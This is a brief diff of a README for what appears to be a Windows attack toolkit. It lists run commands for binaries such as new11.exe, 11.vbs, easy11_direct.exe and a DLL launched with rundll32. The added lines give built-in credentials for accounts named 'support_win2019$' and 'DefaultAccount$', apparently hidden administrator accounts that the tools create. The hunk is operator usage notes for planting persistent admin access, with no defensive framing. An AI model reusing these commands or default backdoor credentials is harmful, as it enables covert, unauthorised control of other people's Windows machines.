@@ -68,7 +68,8 @@ new10_workgroup.exe > 2.txt
 ```
 new11.exe user pass
 11.vbs #direct to use
-easy11_direct.exe #direct to use
+easy11_direct.exe #direct to use   admininfo:support_win2019$/NoBase64==
+easy11.dll  #rundll32 easy11.dll admin  admininfo:DefaultAccount$/NoBase64==
 ```
 
 ## 12Write The Registry
